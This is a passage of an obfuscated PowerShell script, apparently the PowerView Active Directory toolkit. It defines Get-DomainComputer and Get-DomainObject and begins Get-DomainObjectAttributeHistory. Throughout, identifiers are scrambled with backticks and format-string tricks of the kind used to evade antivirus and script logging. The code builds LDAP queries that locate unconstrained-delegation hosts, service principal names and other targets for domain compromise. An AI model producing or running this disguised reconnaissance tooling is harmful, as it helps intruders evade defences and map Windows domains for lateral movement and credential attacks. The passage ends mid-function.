                        ${iD`E`NtITydoMA`iN} = ${IdentIty`Ins`T`A`N`Ce}.("{1}{0}"-f 'ng','SubStri').Invoke(${ide`NT`It`yIN`STAnCE}.("{1}{0}"-f'exOf','Ind').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{3}{2}{1}" -f'Write-','se','erbo','V') ('[Ge'+'t-Domai'+'nCo'+'mput'+'e'+'r] '+'Ex'+'t'+'racted '+'d'+'omai'+'n '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${se`ArChe`RARguMe`NTs}[("{0}{1}"-f 'Do','main')] = ${iDe`NTI`T`yD`oMAIN}
                        ${C`oMps`EarC`hEr} = &("{2}{0}{3}{1}{4}" -f 'et-D','nSearch','G','omai','er') @SearcherArguments
                        if (-not ${CoM`P`Se`A`RcHEr}) {
                            &("{3}{1}{0}{2}"-f'-W','e','arning','Writ') ('[G'+'et-Dom'+'a'+'inC'+'o'+'mputer] '+'Unab'+'le'+' '+'to'+' '+'r'+'etri'+'ev'+'e '+'do'+'m'+'ain '+'s'+'earche'+'r '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${IDE`NTi`TyiNs`T`A`NCe}.("{2}{1}{0}"-f 'ins','a','Cont').Invoke('.')) {
                    ${i`d`eNT`iT`YfilTer} += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif (${ID`enTi`TYi`NsT`Ance} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${g`Ui`DbYte`strI`Ng} = (([Guid]${IDEn`TitY`iN`staNCe}).("{2}{1}{0}"-f 'ay','oByteArr','T').Invoke() | &("{2}{0}{1}" -f 'ach-Objec','t','ForE') { '\' + ${_}.("{1}{0}"-f'ng','ToStri').Invoke('X2') }) -join ''
                    ${I`D`EnTitYf`IlTEr} += "(objectguid=$GuidByteString)"
                }
                else {
                    ${Ide`NTityf`IL`T`ER} += "(name=$IdentityInstance)"
                }
            }
            if (${iD`En`TItyF`i`LteR} -and (${iDENt`It`yfILT`ER}.("{1}{0}"-f'm','Tri').Invoke() -ne '') ) {
                ${fI`Lt`ER} += "(|$IdentityFilter)"
            }

            if (${pSBOunDP`ArAm`E`T`eRS}[("{1}{0}{2}" -f 'onst','Unc','rained')]) {
                &("{2}{3}{0}{4}{1}"-f 'Verbo','e','Write','-','s') ("{9}{11}{10}{1}{2}{0}{5}{12}{3}{7}{8}{13}{14}{6}{4}" -f'ing for compute','ainComp','uter] Search','or ','on','rs w','legati','unc','onstr','[','om','Get-D','ith f','a','ined de')
                ${fi`lt`er} += (("{5}{6}{3}{4}{2}{7}{1}{8}{0}" -f'88)','.4.8','nt','co','untCo','(user','Ac','rol:1.2.840.113556.1','03:=5242'))
            }
            if (${psBOU`NdP`Ar`AmeT`ErS}[("{0}{2}{3}{1}" -f 'Tru','oAuth','ste','dT')]) {
                &("{2}{1}{0}" -f'bose','te-Ver','Wri') ("{2}{5}{12}{20}{1}{13}{7}{26}{17}{9}{3}{6}{25}{15}{4}{19}{11}{18}{14}{0}{22}{10}{8}{21}{23}{24}{16}" -f 'n','pu','[Get','g',' ','-Domain',' for compu',' S','or other p','chin','f','r','C','ter]','ed to authe','ers','ls','r','e trust','that a','om','rinc','ticate ','ip','a','t','ea')
                ${f`iLTeR} += ("{1}{6}{2}{3}{0}{4}{5}{7}" -f'e','(','llo','w','dtodelega','teto','msds-a','=*)')
            }
            if (${P`sbOuN`dpARAme`TE`Rs}[("{0}{2}{1}" -f'P','inters','r')]) {
                &("{1}{0}{2}{3}"-f 'b','Write-Ver','os','e') ("{5}{4}{3}{1}{0}{2}{6}"-f'] S','uter','earching for ','Comp','Get-Domain','[','printers')
                ${filT`eR} += ("{0}{4}{2}{3}{1}{5}" -f'(o','=pr','go','ry','bjectCate','intQueue)')
            }
            if (${PsBO`U`N`D`parAM`EteRS}['SPN']) {
                &("{2}{4}{0}{3}{1}"-f'te-','rbose','Wr','Ve','i') ('[Ge'+'t'+'-DomainComp'+'uter'+'] '+'S'+'ea'+'rching'+' '+'for'+' '+'c'+'omput'+'e'+'rs '+'wi'+'th '+'SPN:'+' '+"$SPN")
                ${FI`l`TeR} += "(servicePrincipalName=$SPN)"
            }
            if (${psBoU`NDPaRA`M`eTeRs}[("{1}{0}{2}{3}" -f'per','O','atin','gSystem')]) {
                &("{1}{2}{0}{3}{4}" -f 'er','W','rite-V','bo','se') ('[Get'+'-Do'+'ma'+'inCompu'+'ter] '+'Sea'+'rch'+'ing '+'fo'+'r '+'c'+'omp'+'uters '+'with'+' '+'ope'+'rating'+' '+'sy'+'stem'+': '+"$OperatingSystem")
                ${FIL`Ter} += "(operatingsystem=$OperatingSystem)"
            }
            if (${psBoUnDp`Ara`me`TE`Rs}[("{0}{2}{1}"-f 'Ser','ck','vicePa')]) {
                &("{1}{3}{2}{0}" -f'e','Write-V','os','erb') ('[Get'+'-Domai'+'nCompute'+'r'+'] '+'Sear'+'ch'+'ing '+'fo'+'r '+'compu'+'t'+'ers '+'wi'+'th '+'servi'+'ce '+'pac'+'k: '+"$ServicePack")
                ${f`il`TeR} += "(operatingsystemservicepack=$ServicePack)"
            }
            if (${psbou`Nd`Par`AMeTeRS}[("{1}{0}{2}"-f'ite','S','Name')]) {
                &("{3}{2}{4}{0}{1}"-f'-V','erbose','rit','W','e') ('['+'Get-'+'D'+'om'+'ain'+'Computer] '+'Sear'+'c'+'hin'+'g '+'for'+' '+'co'+'mpute'+'rs '+'wit'+'h '+'site'+' '+'na'+'me: '+"$SiteName")
                ${f`IlTer} += "(serverreferencebl=$SiteName)"
            }
            if (${P`sbOu`NdpaRaMeT`ERs}[("{1}{0}{2}" -f'APFil','LD','ter')]) {
                &("{1}{2}{0}" -f'e','Write-Verbo','s') ('[Get-D'+'omai'+'nCompu'+'t'+'er] '+'Usi'+'ng '+'addit'+'ion'+'al'+' '+'LD'+'AP '+'f'+'i'+'lter: '+"$LDAPFilter")
                ${F`il`TEr} += "$LDAPFilter"
            }
            
            ${uaCF`ILT`er} | &("{3}{2}{1}{0}" -f 't','bjec','re-O','Whe') {${_}} | &("{1}{0}{2}{3}" -f 'h','ForEac','-Objec','t') {
                if (${_} -match ("{1}{2}{0}" -f '_.*','NO','T')) {
                    ${UAc`F`ieLD} = ${_}.("{2}{0}{1}"-f'bstri','ng','Su').Invoke(4)
                    ${ua`CVaL`UE} = [Int](${U`ACeNuM}::${u`A`CFieLD})
                    ${f`iLter} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${uACv`Al`Ue} = [Int](${uacE`N`Um}::${_})
                    ${F`ILtER} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${CompSEa`Rc`HeR}."f`IlT`ER" = "(&(samAccountType=805306369)$Filter)"
            &("{3}{4}{1}{2}{0}"-f 'se','r','bo','Writ','e-Ve') "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter) "

            if (${pSBOuN`Dp`ARAM`E`TE`Rs}[("{0}{1}"-f'F','indOne')]) { ${R`ES`ULTS} = ${CO`M`psEarc`Her}.("{1}{0}"-f'ne','FindO').Invoke() }
            else { ${rEs`ULtS} = ${Com`p`SEARChER}.("{0}{1}"-f'Find','All').Invoke() }
            ${re`SU`LtS} | &("{0}{3}{2}{1}" -f 'W','ect','ere-Obj','h') {${_}} | &("{1}{0}{2}{3}"-f'E','For','ach-','Object') {
                ${up} = ${TR`UE}
                if (${P`SbOU`NDPAra`METe`Rs}[("{0}{1}"-f'P','ing')]) {
                    ${up} = &("{2}{1}{0}" -f 'nection','n','Test-Co') -Count 1 -Quiet -ComputerName ${_}."PROpERt`I`Es"."DnshOS`T`N`AmE"
                }
                if (${U`p}) {
                    if (${p`SBO`UNDpaR`Am`ETE`RS}['Raw']) {
                        
                        ${c`oMP`Ut`ER} = ${_}
                        ${c`oMPUT`Er}."PS`OBJ`ECt"."T`YPe`Names".("{0}{1}"-f'Inser','t').Invoke(0, ("{0}{3}{2}{4}{6}{1}{5}" -f'P','er.Ra','erView.','ow','Com','w','put'))
                    }
                    else {
                        ${cO`Mputer} = &("{1}{4}{2}{3}{0}" -f'rty','Convert','P','rope','-LDAP') -Properties ${_}."PR`OpERTi`es"
                        ${co`mpuT`Er}."P`sObj`ecT"."typ`En`Am`Es".("{0}{1}" -f'I','nsert').Invoke(0, ("{1}{3}{0}{2}" -f'werView.Co','P','mputer','o'))
                    }
                    ${co`M`PUTeR}
                }
            }
            if (${rEsUL`Ts}) {
                try { ${RE`SuL`TS}.("{1}{0}" -f 'e','dispos').Invoke() }
                catch {
                    &("{2}{1}{0}" -f '-Verbose','te','Wri') ('[Ge'+'t-Dom'+'a'+'in'+'Comput'+'er] '+'Erro'+'r '+'d'+'isposin'+'g '+'o'+'f '+'th'+'e '+'Re'+'sult'+'s '+'ob'+'j'+'ect: '+"$_")
                }
            }
            ${CO`mps`eaR`CheR}.("{1}{0}{2}"-f 's','dispo','e').Invoke()
        }
    }
}


function GE`T-D`Omai`NobjeCt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{4}{3}{5}{6}{2}{1}{8}{0}{9}" -f'signment','e','ar','se','U','De','cl','PS','dVarsMoreThanAs','s'}, '')]
    [OutputType({"{2}{1}{3}{4}{0}"-f'Object','w','Po','e','rView.AD'})]
    [OutputType({"{0}{2}{1}{3}{4}"-f 'PowerVi','A','ew.','DOb','ject.Raw'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosItION = 0, ValUEFrOmPIpELiNe = ${t`RuE}, VAlUEfROMpiPElINebYpRoPERTyName = ${t`RUe})]
        [Alias({"{1}{3}{0}{2}"-f 'N','Distin','ame','guished'}, {"{2}{3}{4}{1}{0}" -f 'ame','N','Sam','Acco','unt'}, {"{0}{1}"-f'N','ame'}, {"{1}{0}{6}{5}{4}{2}{3}" -f'mberD','Me','guishedN','ame','n','sti','i'}, {"{2}{1}{0}"-f 'e','Nam','Member'})]
        [String[]]
        ${iD`e`NtiTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'F','ilter'})]
        [String]
        ${l`d`AP`FILtEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pr`Op`ErTIEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADS','Path'})]
        [String]
        ${SEa`R`C`hBAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'Domain','ller','Contro'})]
        [String]
        ${SE`Rv`Er},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{2}{1}{0}" -f 'el','eLev','On'}, {"{2}{0}{1}"-f 'u','btree','S'})]
        [String]
        ${se`A`RcHS`CoPe} = ("{1}{0}{2}" -f'tr','Sub','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resuLtp`Ag`e`s`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`R`V`ERtIMELIMIT},

        [ValidateSet({"{1}{0}" -f 'l','Dac'}, {"{0}{1}"-f'G','roup'}, {"{0}{1}"-f 'No','ne'}, {"{0}{1}" -f'Own','er'}, {"{1}{0}" -f 'cl','Sa'})]
        [String]
        ${se`CURitY`ma`skS},

        [Switch]
        ${t`Om`BstonE},

        [Alias({"{1}{0}"-f'nOne','Retur'})]
        [Switch]
        ${f`iND`oNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReD`e`NtiaL} =  ( varIAbLe ('Q'+'fN') )."V`ALue"::"E`mPTY",

        [Switch]
        ${R`AW}
    )

    DynamicParam {
        ${uACValU`eNA`meS} =  ${Mn`s5}::("{1}{2}{0}"-f 'es','G','etNam').Invoke(${U`ACe`Num})
        
        ${UAcValu`en`AMEs} = ${uACVALU`en`A`M`Es} | &("{3}{1}{0}{4}{2}" -f'h-','Eac','ct','For','Obje') {${_}; "NOT_$_"}
        
        &("{1}{3}{4}{2}{0}"-f'ter','New-D','me','y','namicPara') -Name ("{1}{2}{0}"-f'Filter','U','AC') -ValidateSet ${U`Ac`VaL`UEnAM`ES} -Type ([array])
    }

    BEGIN {
        ${SEARc`h`ERA`RguM`eN`Ts} = @{}
        if (${pSBO`Un`DPa`RameTERs}[("{0}{1}"-f 'D','omain')]) { ${seaR`cH`ErarGuMen`TS}[("{1}{0}"-f 'n','Domai')] = ${Do`MAiN} }
        if (${PsBOU`Nd`ParaM`E`TERs}[("{1}{2}{0}{3}" -f 'i','Prop','ert','es')]) { ${S`e`ARcHErARGUmE`NtS}[("{1}{2}{0}"-f 'es','Pr','operti')] = ${pR`opeR`TI`eS} }
        if (${pS`Bou`Nd`paR`AmETERs}[("{0}{1}{2}" -f'S','e','archBase')]) { ${s`e`ARCh`ERarGUments}[("{1}{0}{2}"-f 'chBa','Sear','se')] = ${S`Ea`RChBasE} }
        if (${ps`B`o`UNdP`ARaMETErs}[("{1}{0}"-f'er','Serv')]) { ${SeArc`H`E`RarguMEnts}[("{0}{1}"-f'S','erver')] = ${Se`RveR} }
        if (${p`SB`oUNdParam`Et`ERS}[("{0}{2}{1}" -f'S','Scope','earch')]) { ${s`earcH`eR`Argu`MEnTS}[("{3}{0}{2}{1}" -f'arch','cope','S','Se')] = ${S`earc`HSc`ope} }
        if (${pSBO`U`N`DPaR`AME`TerS}[("{0}{3}{2}{1}"-f 'ResultP','Size','e','ag')]) { ${s`EAR`c`HErarGuM`E`NTs}[("{2}{1}{3}{0}" -f 'Size','t','Resul','Page')] = ${R`esULtP`AGe`Size} }
        if (${P`SBO`Und`PaRa`MeTERS}[("{0}{1}{2}"-f 'Server','TimeLim','it')]) { ${se`A`RCherAR`gUMEnTS}[("{4}{2}{0}{3}{1}" -f 'e','t','erTim','Limi','Serv')] = ${se`RveR`Ti`melimiT} }
        if (${pSboUN`D`p`A`Ra`meters}[("{2}{1}{3}{0}"-f'Masks','curi','Se','ty')]) { ${SEAR`cher`ARGu`m`EntS}[("{0}{3}{2}{1}"-f'Securit','s','k','yMas')] = ${seCur`iTY`mASks} }
        if (${pSbo`UndpARA`m`eT`ERs}[("{2}{0}{1}" -f'n','e','Tombsto')]) { ${Se`ARcheR`AR`g`UMEnTS}[("{1}{0}{2}"-f 's','Tomb','tone')] = ${TOMb`sT`ONE} }
        if (${pS`BOuND`Para`meTe`Rs}[("{2}{1}{0}"-f'l','tia','Creden')]) { ${seaRC`heRA`Rg`Ume`Nts}[("{0}{2}{1}" -f'Cre','ial','dent')] = ${cR`e`DEn`TIAl} }
        ${OB`j`E`CTsEArchEr} = &("{3}{2}{0}{1}{4}" -f 't-Dom','ain','e','G','Searcher') @SearcherArguments
    }

    PROCESS {
        
        if (${p`sb`OUNDparaM`et`ers} -and (${p`sb`oUnD`PArAmE`TERs}."C`oUNT" -ne 0)) {
            &("{2}{3}{1}{0}" -f'meter','micPara','New','-Dyna') -CreateVariables -BoundParameters ${psBoU`NDParam`Et`ERS}
        }
        if (${oBjECt`SE`A`RC`hER}) {
            ${Id`enT`I`TyfiL`Ter} = ''
            ${f`ILtER} = ''
            ${i`D`eN`TITy} | &("{0}{1}{2}"-f'Wh','er','e-Object') {${_}} | &("{1}{2}{0}" -f't','For','Each-Objec') {
                ${i`De`NTI`T`yIN`STanCE} = ${_}.("{0}{1}"-f'R','eplace').Invoke('(', '\28').("{1}{0}"-f'eplace','R').Invoke(')', '\29')
                if (${IDeN`TiTyiN`s`T`ANCe} -match ("{0}{1}" -f '^S-','1-')) {
                    ${IDEN`TiT`Y`FILTeR} += "(objectsid=$IdentityInstance)"
                }
                elseif (${I`dE`NtitYiN`StAn`Ce} -match ((("{1}{2}{3}{0}"-f')=','^(CNZX','wOUZ','XwDC')) -cREPlaCE 'ZXw',[ChaR]124)) {
                    ${iDeNt`Ity`FIL`Ter} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psboUNd`pARa`m`E`T`ErS}[("{0}{1}"-f'D','omain')]) -and (-not ${psBouNd`P`Ar`AmEtERs}[("{0}{2}{1}" -f 'Sear','ase','chB')])) {
                        
                        
                        ${I`dEn`TIt`YdOm`Ain} = ${id`entITyIn`STA`N`CE}.("{2}{1}{0}" -f'ing','tr','SubS').Invoke(${iDe`NtItYiNS`TA`N`CE}.("{1}{2}{0}"-f 'exOf','In','d').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{1}{3}{0}"-f 'rbose','te-','Wri','Ve') ('[Get-Domain'+'Objec'+'t'+']'+' '+'E'+'x'+'tracted '+'d'+'o'+'main '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        ${SEarcH`ERArgu`MEN`Ts}[("{0}{1}" -f 'D','omain')] = ${iDENt`ITydoM`A`iN}
                        ${Ob`jE`CTSE`AR`cHeR} = &("{3}{0}{1}{2}" -f't-DomainSearch','e','r','Ge') @SearcherArguments
                        if (-not ${O`B`j`eCTsearc`HER}) {
                            &("{1}{2}{0}" -f'Warning','Wri','te-') ('[G'+'et-'+'Doma'+'inObject]'+' '+'U'+'n'+'able '+'t'+'o '+'retr'+'ie'+'v'+'e '+'domai'+'n '+'sear'+'c'+'her '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${ID`EnTI`TY`InS`TANcE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${G`UidBYtEs`TR`iNg} = (([Guid]${Id`eN`TiTY`inSTA`NcE}).("{0}{2}{3}{1}" -f 'ToBy','y','teAr','ra').Invoke() | &("{2}{3}{1}{0}" -f'h-Object','c','ForE','a') { '\' + ${_}.("{1}{0}{2}" -f'tri','ToS','ng').Invoke('X2') }) -join ''
                    ${I`de`NTity`FiLTeR} += "(objectguid=$GuidByteString)"
                }
                elseif (${IdenTit`y`i`NsTancE}.("{1}{0}{2}" -f 'ontain','C','s').Invoke('\')) {
                    ${cONve`RT`EDIdentIT`Yin`S`TancE} = ${iDENti`T`YInStA`NCE}.("{0}{1}"-f 'Repla','ce').Invoke('\28', '(').("{0}{1}" -f'Replac','e').Invoke('\29', ')') | &("{4}{3}{0}{2}{1}"-f 'DN','me','a','nvert-A','Co') -OutputType ("{1}{0}" -f 'cal','Canoni')
                    if (${C`OnVErt`eD`id`entITYin`stAn`cE}) {
                        ${oBjEC`TDOm`A`IN} = ${Co`NV`Erted`ideNTitYINst`A`N`Ce}.("{0}{1}{2}{3}"-f 'Sub','St','r','ing').Invoke(0, ${cOn`VERTeD`IdENT`ITYi`NsTaN`CE}.("{1}{0}{2}"-f 'dexO','In','f').Invoke('/'))
                        ${O`Bj`EC`TNamE} = ${iden`TIt`yinsTA`NCe}.("{0}{1}"-f'Spl','it').Invoke('\')[1]
                        ${I`dENTI`T`YFil`TeR} += "(samAccountName=$ObjectName)"
                        ${SeArCHEr`AR`G`Um`eNTS}[("{1}{0}"-f 'n','Domai')] = ${ObJe`c`TD`Omain}
                        &("{0}{2}{1}{3}"-f 'Write-V','rb','e','ose') ('['+'Get'+'-D'+'oma'+'inObject] '+'Extr'+'acte'+'d '+'domain'+' '+"'$ObjectDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${o`BJEcT`sEARc`HEr} = &("{3}{1}{0}{2}"-f 'inSearche','oma','r','Get-D') @SearcherArguments
                    }
                }
                elseif (${ideNTIt`y`iNSTA`NCE}.("{0}{1}" -f 'Contai','ns').Invoke('.')) {
                    ${iDentiT`YfI`Lt`eR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${iD`EN`TIt`Y`FIltER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${id`e`Nt`ItyFil`TEr} -and (${iDEN`T`ITY`FIltER}.("{0}{1}" -f'Tri','m').Invoke() -ne '') ) {
                ${fIL`T`eR} += "(|$IdentityFilter)"
            }

            if (${p`Sbou`NdpARa`meteRs}[("{1}{0}{2}"-f'AP','LD','Filter')]) {
                &("{0}{3}{2}{1}" -f 'Write-Verb','e','s','o') ('[G'+'e'+'t-Do'+'ma'+'inObject] '+'Usin'+'g'+' '+'addi'+'tiona'+'l'+' '+'LDA'+'P '+'f'+'i'+'lter: '+"$LDAPFilter")
                ${f`i`lTER} += "$LDAPFilter"
            }

            
            ${Ua`cFiLt`er} | &("{1}{2}{0}"-f'ject','W','here-Ob') {${_}} | &("{4}{3}{1}{0}{2}" -f'e','bj','ct','h-O','ForEac') {
                if (${_} -match ("{0}{1}" -f 'N','OT_.*')) {
                    ${U`AcFIe`lD} = ${_}.("{1}{3}{0}{2}" -f 'bs','S','tring','u').Invoke(4)
                    ${UAC`V`AluE} = [Int](${UaC`eNum}::${U`Ac`FieLD})
                    ${fI`Lter} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${UAC`V`A`lUe} = [Int](${uA`CeN`Um}::${_})
                    ${f`ilt`Er} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if (${Fil`T`eR} -and ${fIlt`Er} -ne '') {
                ${o`Bj`ectsEaRchEr}."F`ilter" = "(&$Filter)"
            }
            &("{1}{2}{0}" -f 'erbose','Wr','ite-V') "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter) "

            if (${p`sBOuN`DPARA`Me`T`eRS}[("{1}{2}{0}"-f'One','Fin','d')]) { ${RE`sul`TS} = ${Ob`j`Ec`TSE`ARCheR}.("{1}{0}" -f'ne','FindO').Invoke() }
            else { ${rES`U`lts} = ${Obj`EctSe`A`RCheR}.("{1}{0}"-f 'l','FindAl').Invoke() }
            ${resuL`Ts} | &("{2}{0}{1}" -f 'ere-Obje','ct','Wh') {${_}} | &("{3}{2}{1}{0}"-f 'ject','b','ch-O','ForEa') {
                if (${P`Sbou`N`dP`ARameTERS}['Raw']) {
                    
                    ${o`B`jeCt} = ${_}
                    ${oBJe`CT}."Ps`OBJEcT"."TYPENA`M`ES".("{0}{1}"-f'I','nsert').Invoke(0, ("{1}{3}{2}{4}{0}{5}"-f 'e','P','w.ADOb','owerVie','j','ct.Raw'))
                }
                else {
                    ${oB`jeCt} = &("{1}{0}{3}{2}"-f'n','Co','operty','vert-LDAPPr') -Properties ${_}."p`RopEr`TiES"
                    ${oBJ`ect}."psob`j`eCt"."t`YPe`NAM`ES".("{1}{0}" -f 'rt','Inse').Invoke(0, ("{3}{2}{1}{0}" -f 'ct','e','j','PowerView.ADOb'))
                }
                ${O`BJE`cT}
            }
            if (${R`ESU`LTs}) {
                try { ${r`esuL`Ts}.("{2}{1}{0}" -f'se','o','disp').Invoke() }
                catch {
                    &("{1}{0}{2}" -f 'rbo','Write-Ve','se') ('[Get-D'+'om'+'ainObject'+']'+' '+'Error'+' '+'di'+'spo'+'sing '+'o'+'f '+'t'+'he '+'Res'+'u'+'lts '+'o'+'bject: '+"$_")
                }
            }
            ${OBJE`cts`E`ARCHeR}.("{1}{0}{2}"-f'pos','dis','e').Invoke()
        }
    }
}


function Get-`DOmAI`NOBj`eCT`AT`TR`IButeHIST`orY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{5}{4}{0}{6}{7}{8}" -f'Mor','PSUse','De','claredV','rs','a','eThan','Assignmen','ts'}, '')]
    [OutputType({"{2}{3}{6}{0}{4}{1}{7}{5}" -f'ew.A','bjectAtt','P','owe','DO','uteHistory','rVi','rib'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTioN = 0, VALUeFrOmPIPelINE = ${T`Rue}, VaLueFrOmPIpeLINebYpROpeRTyNAmE = ${Tr`UE})]
        [Alias({"{4}{3}{5}{1}{0}{2}" -f'ishe','ngu','dName','s','Di','ti'}, {"{3}{1}{2}{0}" -f 'ame','amAcco','untN','S'}, {"{0}{1}"-f'Na','me'}, {"{4}{1}{5}{0}{3}{2}"-f 'isting','e','Name','uished','M','mberD'}, {"{1}{0}{2}"-f 'mberNam','Me','e'})]
        [String[]]
        ${idEn`T`ity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`A`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'er','ilt','F'})]
        [String]
        ${ldA`pFIl`TER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prope`RT`IeS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADSPat','h'})]
        [String]
        ${sEa`R`Chb`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{2}"-f'Control','Doma','ler','in'})]
        [String]
        ${S`er`VEr},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{0}{2}{1}"-f'O','eLevel','n'}, {"{2}{1}{0}" -f 'e','tre','Sub'})]
        [String]
        ${S`e`ARchsc`ope} = ("{2}{1}{0}" -f'e','ubtre','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`s`UltPagEs`IZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERv`eRTIme`L`iM`It},

        [Switch]
        ${t`OMBstO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREd`eNtI`AL} =  (GeT-ITEm ('VAriaB'+'L'+'e:q'+'fN'))."V`ALUe"::"E`mptY",

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${s`E`ArcHeraR`Gu`mENTS} = @{
            ("{0}{3}{1}{2}"-f 'Pr','e','s','operti')    =   ("{4}{6}{8}{0}{7}{5}{1}{3}{2}" -f'lattr','me','adata','t','msd','e','s-','ibut','rep'),("{0}{1}{3}{4}{5}{2}" -f'dis','tingu','me','is','h','edna')
            'Raw'           =   ${tr`UE}
        }
        if (${psb`OUndpa`RA`me`TeRS}[("{1}{0}"-f'n','Domai')]) { ${S`EarcHeRaRgU`M`E`NTs}[("{1}{2}{0}" -f'in','D','oma')] = ${doM`A`in} }
        if (${PSb`OUn`DpArA`m`eters}[("{1}{0}{2}" -f'l','LDAPFi','ter')]) { ${SearCHE`RA`RGU`MeN`Ts}[("{0}{2}{1}" -f'LDA','ilter','PF')] = ${LDa`pF`IlT`er} }
        if (${Ps`BouND`P`ARamEtErS}[("{0}{2}{1}"-f'SearchB','se','a')]) { ${seArchE`RA`R`GumeN`Ts}[("{1}{0}{2}" -f 'Bas','Search','e')] = ${SeArc`hB`ASe} }
        if (${PSb`O`UNDparam`EteRs}[("{0}{1}"-f'Ser','ver')]) { ${se`ArCHE`Rar`guments}[("{2}{0}{1}"-f'erv','er','S')] = ${SEr`V`Er} }
        if (${Ps`B`OU`NdPA`RaMeteRs}[("{1}{2}{0}" -f'pe','S','earchSco')]) { ${se`ARCHE`R`ArGumEnts}[("{3}{0}{1}{2}"-f'Sc','o','pe','Search')] = ${s`E`ArChs`coPe} }
        if (${p`sbOUNDpAr`A`MeTe`Rs}[("{3}{0}{2}{1}"-f'sultP','Size','age','Re')]) { ${Se`AR`c`H`E`RarguMEntS}[("{0}{2}{1}{3}" -f'ResultP','e','ag','Size')] = ${r`esuLtpAg`e`s`IZE} }
        if (${psBO`U`N`Dpar`AMETE`Rs}[("{2}{1}{3}{0}"-f'Limit','i','ServerT','me')]) { ${SEA`RC`HErargu`menTs}[("{2}{0}{1}{3}" -f'rve','rT','Se','imeLimit')] = ${sEr`VERTiM`eLI`MIT} }
        if (${P`sB`oUnDPArAmet`e`RS}[("{2}{0}{1}" -f 'omb','stone','T')]) { ${sE`ArcHerargu`MeN`TS}[("{2}{1}{0}" -f'e','ton','Tombs')] = ${TOm`BStO`NE} }
        if (${p`SBou`Ndp`ArA`mETErS}[("{1}{0}{2}" -f'ndOn','Fi','e')]) { ${Sea`R`C`HeraR`g`UmeNTs}[("{1}{2}{0}"-f 'ne','Find','O')] = ${FIn`d`ONe} }
        if (${P`sb`OUNDP`ARAMET`e`Rs}[("{2}{1}{0}"-f 'ial','nt','Crede')]) { ${SEa`R`cH`erArgumEnts}[("{2}{0}{1}" -f'den','tial','Cre')] = ${Cr`eDEN`T`IaL} }

        if (${ps`BouNdp`A`RAmeT`E`RS}[("{2}{1}{0}"-f'erties','p','Pro')]) {
            ${pROPE`RTYF`i`lT`er} = ${PsBoUNdPar`A`m`et`ers}[("{2}{0}{1}"-f 'ertie','s','Prop')] -Join '|'
        }
        else {
            ${pRopEr`T`yf`ilteR} = ''
        }
    }

    PROCESS {
        if (${p`SBouN`Dparam`E`TErs}[("{1}{2}{0}"-f 'y','Ide','ntit')]) { ${SEa`RcH`ERaRgU`ments}[("{0}{1}"-f 'Iden','tity')] = ${i`Denti`TY} }

        &("{1}{2}{0}{4}{3}" -f'-Dom','G','et','inObject','a') @SearcherArguments | &("{1}{3}{2}{0}{4}" -f 'ach-Ob','F','E','or','ject') {
            ${oBJeC`T`dN} = ${_}."PR`o`PeRTIES"[("{4}{1}{2}{0}{5}{3}" -f 'uishedna','n','g','e','disti','m')][0]
            ForEach(${X`mlN`odE} in ${_}."proP`erTi`es"[("{0}{1}{2}{3}{4}" -f 'ms','d','s-replattribut','em','etadata')]) {
                ${T`empO`B`ject} = [xml]${Xm`lN`oDe} | &("{1}{2}{0}" -f 'Object','Selec','t-') -ExpandProperty ("{0}{1}{4}{2}{3}" -f 'D','S_REP','ATTR_','META_DATA','L_') -ErrorAction ("{1}{2}{0}" -f 'Continue','Silentl','y')
                if (${temP`oBJ`e`ct}) {
                    if (${TE`M`POBJect}."Ps`Z`ATTRIB`UTena`mE" -Match ${P`R`O`PErTY`FILTeR}) {
